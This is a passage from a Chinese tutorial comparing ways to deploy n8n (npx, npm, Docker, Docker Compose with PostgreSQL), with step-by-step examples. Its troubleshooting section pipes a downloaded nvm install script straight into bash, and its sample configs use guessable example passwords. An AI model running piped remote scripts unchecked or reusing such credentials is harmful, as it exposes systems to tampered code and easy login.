└─────────────────────────────────────────────────┘
</code></pre>
<p><strong>核心区别对比：</strong></p>















































<table><thead><tr><th>部署方式</th><th>安装难度</th><th>适用场景</th><th>数据持久化</th><th>生产就绪</th></tr></thead><tbody><tr><td>npx n8n</td><td>⭐ 极简单</td><td>快速体验、临时测试</td><td>❌ 不持久</td><td>❌ 否</td></tr><tr><td>npm安装</td><td>⭐⭐ 简单</td><td>本地开发、个人使用</td><td>✅ 持久</td><td>⚠️ 需配置</td></tr><tr><td>Docker</td><td>⭐⭐⭐ 中等</td><td>生产环境、容器化</td><td>✅ 持久</td><td>✅ 是</td></tr><tr><td>Docker Compose</td><td>⭐⭐⭐⭐ 较复杂</td><td>企业级、多服务</td><td>✅ 持久</td><td>✅ 是</td></tr><tr><td>n8n Cloud</td><td>⭐ 极简单</td><td>不想运维、快速上线</td><td>✅ 托管</td><td>✅ 是</td></tr></tbody></table>
<h4 data-id="heading-5">3.2 方式一：npx快速体验（零安装）</h4>
<p><strong>适用场景：</strong> 只是想快速看看N8N长什么样，或者临时测试某个功能。</p>
<p><strong>工作原理：</strong> <code>npx</code>是npm的一个工具，可以在不安装的情况下直接运行包。当你运行 <code>npx n8n</code>时，它会：</p>
<ol>
<li>自动下载n8n（如果本地没有）</li>
<li>临时运行n8n</li>
<li>关闭后自动清理</li>
</ol>
<p><strong>优点：</strong></p>
<ul>
<li>✅ 零安装，无需配置</li>
<li>✅ 5秒启动，立即可用</li>
<li>✅ 不污染系统环境</li>
<li>✅ 适合快速体验</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>❌ 数据不持久化（关闭后丢失）</li>
<li>❌ 每次都要重新下载（首次）</li>
<li>❌ 不适合生产环境</li>
</ul>
<p><strong>命令：</strong></p>
<pre><code class="hljs language-bash" lang="bash">npx n8n
</code></pre>
<p>启动后，访问 <code>http://localhost:5678</code> 即可使用。</p>
<h4 data-id="heading-6">3.3 方式二：npm全局安装（本地开发）</h4>
<p><strong>适用场景：</strong> 经常使用N8N进行本地开发和测试，希望数据能够持久保存。</p>
<p><strong>前置要求：</strong></p>
<ul>
<li>已安装Node.js（版本要求：20.19 - 24.x）</li>
<li>已安装npm（通常随Node.js一起安装）</li>
</ul>
<p><strong>工作原理：</strong> 通过npm将n8n安装到系统全局，可以像系统命令一样直接使用。</p>
<p><strong>安装步骤：</strong></p>
<ol>
<li>
<p><strong>安装n8n（全局）</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install n8n -g
</code></pre>
</li>
<li>
<p><strong>安装特定版本（可选）</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install -g n8n@2.0.3  <span class="hljs-comment"># 安装稳定版</span>
npm install -g n8n@next   <span class="hljs-comment"># 安装测试版</span>
</code></pre>
</li>
<li>
<p><strong>启动n8n</strong></p>
<pre><code class="hljs language-bash" lang="bash">n8n
<span class="hljs-comment"># 或者</span>
n8n start
</code></pre>
</li>
<li>
<p><strong>更新n8n</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm update -g n8n
</code></pre>
</li>
</ol>
<p><strong>数据存储位置：</strong></p>
<ul>
<li>Windows: <code>C:\Users\&lt;用户名&gt;\.n8n</code></li>
<li>Linux/macOS: <code>~/.n8n</code></li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>✅ 安装简单，一条命令搞定</li>
<li>✅ 数据持久化，工作流会保存</li>
<li>✅ 更新方便，<code>npm update</code>即可</li>
<li>✅ 适合本地开发</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>❌ 需要Node.js环境</li>
<li>❌ 可能与其他Node.js项目冲突</li>
<li>❌ 生产环境需要额外配置（反向代理、SSL等）</li>
</ul>
<p><strong>注意事项：</strong></p>
<ul>
<li>⚠️ 确保Node.js版本在20.19-24.x之间</li>
<li>⚠️ 如果遇到权限问题，可能需要使用 <code>sudo</code>（Linux/macOS）或以管理员身份运行（Windows）</li>
</ul>
<h4 data-id="heading-7">3.4 方式三：Docker单容器部署（推荐生产）</h4>
<p><strong>适用场景：</strong> 生产环境部署，需要环境隔离，方便管理和迁移。</p>
<p><strong>前置要求：</strong></p>
<ul>
<li>已安装Docker（Docker Desktop或Docker Engine）</li>
<li>了解基本的Docker命令</li>
</ul>
<p><strong>为什么推荐Docker？</strong></p>
<ul>
<li>🎯 <strong>环境隔离</strong>：n8n运行在独立容器中，不会影响宿主机环境</li>
<li>🎯 <strong>易于管理</strong>：启动、停止、更新都是一条命令</li>
<li>🎯 <strong>数据持久化</strong>：通过数据卷（Volume）保存数据</li>
<li>🎯 <strong>跨平台</strong>：同样的命令在Windows、Linux、macOS都能用</li>
<li>🎯 <strong>官方推荐</strong>：n8n官方最推荐的生产部署方式</li>
</ul>
<p><strong>基础部署命令：</strong></p>
<pre><code class="hljs language-bash" lang="bash">docker run -it --<span class="hljs-built_in">rm</span> \
  --name n8n \
  -p 5678:5678 \
  -v ~/.n8n:/home/node/.n8n \
  n8nio/n8n
</code></pre>
<p><strong>命令解析：</strong></p>
<ul>
<li><code>-it</code>：交互式终端</li>
<li><code>--rm</code>：容器停止后自动删除（仅用于测试）</li>
<li><code>--name n8n</code>：给容器起个名字</li>
<li><code>-p 5678:5678</code>：端口映射（宿主机:容器）</li>
<li><code>-v ~/.n8n:/home/node/.n8n</code>：数据卷挂载（持久化数据）</li>
<li><code>n8nio/n8n</code>：官方Docker镜像</li>
</ul>
<p><strong>生产环境部署（后台运行）：</strong></p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name n8n \
  --restart unless-stopped \
  -p 5678:5678 \
  -v ~/.n8n:/home/node/.n8n \
  -e N8N_BASIC_AUTH_ACTIVE=<span class="hljs-literal">true</span> \
  -e N8N_BASIC_AUTH_USER=admin \
  -e N8N_BASIC_AUTH_PASSWORD=your-secure-password \
  n8nio/n8n
</code></pre>
<p><strong>常用环境变量：</strong></p>


















































<table><thead><tr><th>变量名</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>N8N_BASIC_AUTH_ACTIVE</code></td><td>启用基础认证</td><td><code>true</code></td></tr><tr><td><code>N8N_BASIC_AUTH_USER</code></td><td>用户名</td><td><code>admin</code></td></tr><tr><td><code>N8N_BASIC_AUTH_PASSWORD</code></td><td>密码</td><td><code>your-password</code></td></tr><tr><td><code>N8N_HOST</code></td><td>主机地址</td><td><code>n8n.example.com</code></td></tr><tr><td><code>N8N_PORT</code></td><td>端口</td><td><code>5678</code></td></tr><tr><td><code>N8N_PROTOCOL</code></td><td>协议</td><td><code>https</code></td></tr><tr><td><code>WEBHOOK_URL</code></td><td>Webhook基础URL</td><td><code>https://n8n.example.com/</code></td></tr><tr><td><code>GENERIC_TIMEZONE</code></td><td>时区</td><td><code>Asia/Shanghai</code></td></tr></tbody></table>
<p><strong>更新n8n：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 停止并删除旧容器</span>
docker stop n8n
docker <span class="hljs-built_in">rm</span> n8n

<span class="hljs-comment"># 拉取最新镜像</span>
docker pull n8nio/n8n

<span class="hljs-comment"># 使用新镜像启动（数据卷会自动保留）</span>
docker run -d \
  --name n8n \
  --restart unless-stopped \
  -p 5678:5678 \
  -v ~/.n8n:/home/node/.n8n \
  n8nio/n8n
</code></pre>
<p><strong>优点：</strong></p>
<ul>
<li>✅ 环境隔离，不影响宿主机</li>
<li>✅ 官方推荐，稳定可靠</li>
<li>✅ 数据持久化，易于备份</li>
<li>✅ 更新简单，拉取新镜像即可</li>
<li>✅ 适合生产环境</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>❌ 需要了解Docker基础</li>
<li>❌ 需要配置反向代理和SSL（生产环境）</li>
</ul>
<h4 data-id="heading-8">3.5 方式四：Docker Compose部署（企业级）</h4>
<p><strong>适用场景：</strong> 需要完整的生产环境，包括数据库、反向代理、SSL证书等。</p>
<p><strong>前置要求：</strong></p>
<ul>
<li>已安装Docker和Docker Compose</li>
<li>了解Docker Compose配置</li>
</ul>
<p><strong>为什么使用Docker Compose？</strong></p>
<ul>
<li>🎯 <strong>多服务管理</strong>：可以同时管理n8n、数据库、反向代理等多个服务</li>
<li>🎯 <strong>配置即代码</strong>：所有配置写在 <code>docker-compose.yml</code>中，易于版本控制</li>
<li>🎯 <strong>一键启动</strong>：<code>docker-compose up</code>启动所有服务</li>
<li>🎯 <strong>网络隔离</strong>：服务之间通过内部网络通信，更安全</li>
</ul>
<p><strong>基础Docker Compose配置：</strong></p>
<p>创建 <code>docker-compose.yml</code>文件：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">n8n:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">n8nio/n8n</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"5678:5678"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_ACTIVE=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_USER=admin</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_PASSWORD=your-secure-password</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">GENERIC_TIMEZONE=Asia/Shanghai</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">n8n_data:/home/node/.n8n</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">n8n_data:</span>
</code></pre>
<p><strong>启动服务：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动（前台运行，用于调试）</span>
docker-compose up

<span class="hljs-comment"># 启动（后台运行，生产环境）</span>
docker-compose up -d

<span class="hljs-comment"># 停止服务</span>
docker-compose down

<span class="hljs-comment"># 查看日志</span>
docker-compose logs -f n8n
</code></pre>
<p><strong>完整生产环境配置（含PostgreSQL数据库）：</strong></p>
<p>创建 <code>docker-compose.yml</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">postgres:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:16</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=n8n</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=n8n_db_password</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=n8n</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">postgres_data:/var/lib/postgresql/data</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">'CMD-SHELL'</span>, <span class="hljs-string">'pg_isready -U n8n -d n8n'</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">5</span>

  <span class="hljs-attr">n8n:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">n8nio/n8n</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"5678:5678"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-comment"># 数据库配置</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_TYPE=postgresdb</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_HOST=postgres</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_PORT=5432</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_DATABASE=n8n</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_USER=n8n</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_PASSWORD=n8n_db_password</span>
  
      <span class="hljs-comment"># 基础认证</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_ACTIVE=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_USER=admin</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_PASSWORD=your-secure-password</span>
  
      <span class="hljs-comment"># 时区</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">GENERIC_TIMEZONE=Asia/Shanghai</span>
  
      <span class="hljs-comment"># 生产环境配置</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">NODE_ENV=production</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_PROTOCOL=https</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_HOST=n8n.example.com</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">WEBHOOK_URL=https://n8n.example.com/</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">n8n_data:/home/node/.n8n</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-attr">postgres:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">service_healthy</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">postgres_data:</span>
  <span class="hljs-attr">n8n_data:</span>
</code></pre>
<p><strong>使用环境变量文件（.env）：</strong></p>
<p>创建 <code>.env</code>文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 数据库配置</span>
POSTGRES_USER=n8n
POSTGRES_PASSWORD=your-db-password
POSTGRES_DB=n8n

<span class="hljs-comment"># n8n配置</span>
N8N_BASIC_AUTH_USER=admin
N8N_BASIC_AUTH_PASSWORD=your-secure-password
N8N_HOST=n8n.example.com
WEBHOOK_URL=https://n8n.example.com/
GENERIC_TIMEZONE=Asia/Shanghai
</code></pre>
<p>修改 <code>docker-compose.yml</code>，使用环境变量：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">postgres:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:16</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=${POSTGRES_USER}</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=${POSTGRES_PASSWORD}</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=${POSTGRES_DB}</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">postgres_data:/var/lib/postgresql/data</span>

  <span class="hljs-attr">n8n:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">n8nio/n8n</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"5678:5678"</span>
    <span class="hljs-attr">env_file:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">.env</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_TYPE=postgresdb</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_HOST=postgres</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_PORT=5432</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_DATABASE=${POSTGRES_DB}</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_USER=${POSTGRES_USER}</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_PASSWORD=${POSTGRES_PASSWORD}</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">n8n_data:/home/node/.n8n</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">postgres</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">postgres_data:</span>
  <span class="hljs-attr">n8n_data:</span>
</code></pre>
<p><strong>优点：</strong></p>
<ul>
<li>✅ 完整的生产环境配置</li>
<li>✅ 多服务统一管理</li>
<li>✅ 配置可版本控制</li>
<li>✅ 支持数据库等外部依赖</li>
<li>✅ 适合企业级部署</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>❌ 配置相对复杂</li>
<li>❌ 需要了解Docker Compose</li>
</ul>
<h4 data-id="heading-9">3.6 部署方式选择建议</h4>
<p><strong>快速决策树：</strong></p>
<pre><code class="hljs">想要快速体验？
  ├─ 是 → 使用 npx n8n
  └─ 否 → 继续

本地开发使用？
  ├─ 是 → 使用 npm install -g n8n
  └─ 否 → 继续

需要生产环境？
  ├─ 是 → 继续
  └─ 否 → 使用 Docker 单容器

需要数据库、反向代理等完整方案？
  ├─ 是 → 使用 Docker Compose
  └─ 否 → 使用 Docker 单容器
</code></pre>
<p><strong>具体场景推荐：</strong></p>








































<table><thead><tr><th>场景</th><th>推荐方式</th><th>理由</th></tr></thead><tbody><tr><td>第一次接触，想看看</td><td>npx n8n</td><td>零安装，5秒启动</td></tr><tr><td>本地开发，经常使用</td><td>npm全局安装</td><td>简单直接，数据持久</td></tr><tr><td>个人项目，简单部署</td><td>Docker单容器</td><td>隔离环境，易于管理</td></tr><tr><td>团队使用，需要数据库</td><td>Docker Compose + PostgreSQL</td><td>完整方案，稳定可靠</td></tr><tr><td>企业生产，高可用</td><td>Docker Compose + 完整配置</td><td>支持扩展，易于维护</td></tr><tr><td>不想运维，快速上线</td><td>n8n Cloud</td><td>官方托管，省心省力</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-10">四、实战案例</h3>
<p>光说不练假把式，下面我通过三个实战案例，带你一步步完成部署。</p>
<h4 data-id="heading-11">案例1：5分钟快速体验（npx方式）</h4>
<p><strong>目标：</strong> 零安装，快速体验N8N</p>
<p><strong>步骤：</strong></p>
<ol>
<li>
<p><strong>打开终端（Windows PowerShell / Linux Terminal / macOS Terminal）</strong></p>
</li>
<li>
<p><strong>运行命令</strong></p>
<pre><code class="hljs language-bash" lang="bash">npx n8n
</code></pre>
</li>
<li>
<p><strong>等待启动</strong>（首次会下载，约1-2分钟）</p>
<pre><code class="hljs language-arduino" lang="arduino">n8n ready on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>, port <span class="hljs-number">5678</span>
</code></pre>
</li>
<li>
<p><strong>打开浏览器</strong>
访问：<code>http://localhost:5678</code></p>
</li>
<li>
<p><strong>完成！</strong> 现在你可以开始创建第一个工作流了</p>
</li>
</ol>
<p><strong>验证：</strong></p>
<ul>
<li>✅ 浏览器能打开n8n界面</li>
<li>✅ 可以创建新工作流</li>
<li>✅ 可以拖拽节点</li>
</ul>
<p><strong>注意事项：</strong></p>
<ul>
<li>⚠️ 关闭终端后，n8n会停止运行</li>
<li>⚠️ 数据不会保存，重启后丢失</li>
<li>⚠️ 仅用于快速体验，不适合正式使用</li>
</ul>
<h4 data-id="heading-12">案例2：本地开发环境部署（npm方式）</h4>
<p><strong>目标：</strong> 在本地搭建可持久化的N8N开发环境</p>
<p><strong>前置检查：</strong></p>
<ol>
<li>
<p><strong>检查Node.js版本</strong></p>
<pre><code class="hljs language-bash" lang="bash">node --version
</code></pre>
<p>确保版本在 20.19 - 24.x 之间</p>
</li>
<li>
<p><strong>检查npm版本</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm --version
</code></pre>
</li>
</ol>
<p><strong>部署步骤：</strong></p>
<ol>
<li>
<p><strong>全局安装n8n</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install n8n -g
</code></pre>
</li>
<li>
<p><strong>验证安装</strong></p>
<pre><code class="hljs language-bash" lang="bash">n8n --version
</code></pre>
</li>
<li>
<p><strong>启动n8n</strong></p>
<pre><code class="hljs language-bash" lang="bash">n8n
</code></pre>
</li>
<li>
<p><strong>访问界面</strong>
打开浏览器：<code>http://localhost:5678</code></p>
</li>
<li>
<p><strong>配置数据目录（可选）</strong>
如果想自定义数据存储位置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Windows PowerShell</span>
<span class="hljs-variable">$env</span>:N8N_USER_FOLDER=<span class="hljs-string">"D:\n8n-data"</span>
n8n

<span class="hljs-comment"># Linux/macOS</span>
<span class="hljs-built_in">export</span> N8N_USER_FOLDER=<span class="hljs-string">"/path/to/n8n-data"</span>
n8n
</code></pre>
</li>
</ol>
<p><strong>验证：</strong></p>
<ul>
<li>✅ n8n正常启动</li>
<li>✅ 可以创建和保存工作流</li>
<li>✅ 关闭重启后，工作流仍然存在</li>
<li>✅ 数据保存在 <code>~/.n8n</code> 目录</li>
</ul>
<p><strong>常见问题解决：</strong></p>
<p><strong>问题1：权限错误（Linux/macOS）</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 解决方案：使用sudo或修改npm全局目录权限</span>
sudo npm install n8n -g
<span class="hljs-comment"># 或者</span>
<span class="hljs-built_in">mkdir</span> ~/.npm-global
npm config <span class="hljs-built_in">set</span> prefix <span class="hljs-string">'~/.npm-global'</span>
<span class="hljs-built_in">export</span> PATH=~/.npm-global/bin:<span class="hljs-variable">$PATH</span>
npm install n8n -g
</code></pre>
<p><strong>问题2：端口被占用</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 解决方案：使用其他端口</span>
n8n --port 5679
</code></pre>
<p><strong>问题3：Node.js版本不兼容</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 解决方案：使用nvm管理Node.js版本</span>
<span class="hljs-comment"># 安装nvm（Linux/macOS）</span>
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash

<span class="hljs-comment"># 安装并使用Node.js 20</span>
nvm install 20
nvm use 20
</code></pre>
<h4 data-id="heading-13">案例3：生产环境部署（Docker Compose方式）</h4>
<p><strong>目标：</strong> 使用Docker Compose部署包含PostgreSQL数据库的完整n8n环境</p>
<p><strong>前置要求：</strong></p>
<ul>
<li>已安装Docker和Docker Compose</li>
<li>有服务器（本地或云服务器）</li>
</ul>
<p><strong>部署步骤：</strong></p>
<h5 data-id="heading-14">步骤1：创建项目目录</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> n8n-production
<span class="hljs-built_in">cd</span> n8n-production
</code></pre>
<h5 data-id="heading-15">步骤2：创建docker-compose.yml</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">postgres:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:16</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=n8n</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=n8n_secure_password_123</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=n8n</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">postgres_data:/var/lib/postgresql/data</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">'CMD-SHELL'</span>, <span class="hljs-string">'pg_isready -U n8n -d n8n'</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">5</span>

  <span class="hljs-attr">n8n:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">n8nio/n8n</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"5678:5678"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-comment"># 数据库配置</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_TYPE=postgresdb</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_HOST=postgres</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_PORT=5432</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_DATABASE=n8n</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_USER=n8n</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_POSTGRESDB_PASSWORD=n8n_secure_password_123</span>
  
      <span class="hljs-comment"># 基础认证（生产环境必须启用）</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_ACTIVE=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_USER=admin</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">N8N_BASIC_AUTH_PASSWORD=admin_secure_password_123</span>
  
      <span class="hljs-comment"># 时区</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">GENERIC_TIMEZONE=Asia/Shanghai</span>
  
      <span class="hljs-comment"># 生产环境配置</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">NODE_ENV=production</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">n8n_data:/home/node/.n8n</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-attr">postgres:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">service_healthy</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">postgres_data:</span>
  <span class="hljs-attr">n8n_data:</span>
</code></pre>
<h5 data-id="heading-16">步骤3：启动服务</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动所有服务（后台运行）</span>
docker-compose up -d

<span class="hljs-comment"># 查看启动日志</span>
docker-compose logs -f
</code></pre>
<h5 data-id="heading-17">步骤4：验证部署</h5>
<ol>
<li>
<p><strong>检查容器状态</strong></p>
<pre><code class="hljs language-bash" lang="bash">docker-compose ps
</code></pre>
<p>应该看到两个服务都在运行（Up状态）</p>
</li>
<li>
<p><strong>检查日志</strong></p>
<pre><code class="hljs language-bash" lang="bash">docker-compose logs n8n
</code></pre>
<p>应该看到类似输出：</p>
<pre><code class="hljs language-arduino" lang="arduino">n8n ready on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>, port <span class="hljs-number">5678</span>
</code></pre>
</li>
<li>
<p><strong>访问界面</strong>
打开浏览器：<code>http://localhost:5678</code></p>
<ul>
<li>用户名：<code>admin</code></li>
<li>密码：<code>admin_secure_password_123</code></li>
</ul>
</li>
</ol>
<h5 data-id="heading-18">步骤5：配置反向代理（生产环境推荐）</h5>
<p>如果需要通过域名访问，需要配置Nginx反向代理。</p>
<p>创建 <code>nginx.conf</code>：</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name n8n.example.com;

    location / {
        proxy_pass http://localhost:5678;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
</code></pre>
<p><strong>验证：</strong></p>
<ul>
<li>✅ 两个容器都在运行</li>
<li>✅ 可以访问n8n界面</li>
<li>✅ 可以使用用户名密码登录</li>
<li>✅ 创建的工作流可以保存</li>
<li>✅ 重启后数据不丢失</li>
</ul>
<p><strong>数据备份：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 备份n8n数据</span>
docker run --<span class="hljs-built_in">rm</span> \
  -v n8n-production_n8n_data:/data \
  -v $(<span class="hljs-built_in">pwd</span>):/backup \
  alpine tar czf /backup/n8n-backup-$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz -C /data .

<span class="hljs-comment"># 备份PostgreSQL数据</span>
docker-compose <span class="hljs-built_in">exec</span> postgres pg_dump -U n8n n8n &gt; backup-$(<span class="hljs-built_in">date</span> +%Y%m%d).sql
</code></pre>
<p><strong>更新n8n：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 拉取最新镜像</span>
docker-compose pull n8n

<span class="hljs-comment"># 重启服务（使用新镜像）</span>
docker-compose up -d n8n
</code></pre>
<hr/>
<h3 data-id="heading-19">五、总结</h3>
<h4 data-id="heading-20">核心知识点回顾</h4>
<p>今天这篇文章，我们详细介绍了N8N的四种主要部署方式：</p>
<ol>
<li>
<p><strong>npx快速体验</strong></p>
<ul>
<li>零安装，5秒启动</li>
<li>适合快速体验和临时测试</li>
<li>数据不持久化</li>
</ul>
</li>
<li>
<p><strong>npm全局安装</strong></p>
<ul>
<li>简单直接，一条命令安装</li>
<li>适合本地开发和个人使用</li>
<li>需要Node.js环境（20.19-24.x）</li>
</ul>
</li>
<li>
<p><strong>Docker单容器部署</strong></p>
<ul>
<li>官方推荐的生产部署方式</li>
<li>环境隔离，易于管理</li>
<li>支持数据持久化</li>
</ul>
</li>
<li>
<p><strong>Docker Compose部署</strong></p>
<ul>
